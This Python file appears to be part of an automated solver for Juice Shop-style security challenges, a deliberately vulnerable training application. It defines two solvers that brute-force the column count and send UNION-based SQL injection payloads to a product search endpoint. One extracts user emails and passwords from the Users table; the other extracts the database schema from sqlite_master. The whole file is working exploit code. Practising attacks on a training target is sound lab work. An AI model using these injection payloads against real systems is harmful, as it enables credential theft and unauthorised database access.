from core.base_solver import BaseSolver
from loguru import logger
import json

class UnionSqlInjectionSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "unionSqlInjectionChallenge"

    def solve(self) -> bool:
        # We need to exfiltrate all user emails and passwords
        # Query: SELECT * FROM Products WHERE (name LIKE '%...%' ...)
        # Columns in Products: 9 typically (id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt)
        
        # We brute force column count from 1 to 20
        for i in range(1, 21):
            # Try to get email and password from Users table
            # We put them in visible fields like 'name' (2) and 'description' (3)
            parts = ["1"] * i
            if i >= 4:
                parts[1] = "email"
                parts[2] = "password"
            
            select_clause = ", ".join(parts)
            payload = f"')) UNION SELECT {select_clause} FROM Users-- "
            
            res = self.client.get("/rest/products/search", params={"q": payload})
            if res.status_code == 200:
                # Check if it contains emails (e.g., admin@juice-sh.op)
                if "admin@juice-sh.op" in res.text:
                    logger.success(f"Union SQLi successful with {i} columns!")
                    return True
        return False

class DbSchemaSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "dbSchemaChallenge"

    def solve(self) -> bool:
        # Exfiltrate schema from sqlite_master
        for i in range(1, 21):
            parts = ["1"] * i
            if i >= 2:
                parts[1] = "sql"
            
            select_clause = ", ".join(parts)
            payload = f"')) UNION SELECT {select_clause} FROM sqlite_master-- "
            
            res = self.client.get("/rest/products/search", params={"q": payload})
            if res.status_code == 200:
                if "CREATE TABLE" in res.text:
                    logger.success(f"DB Schema exfiltration successful with {i} columns!")
                    return True
        return False
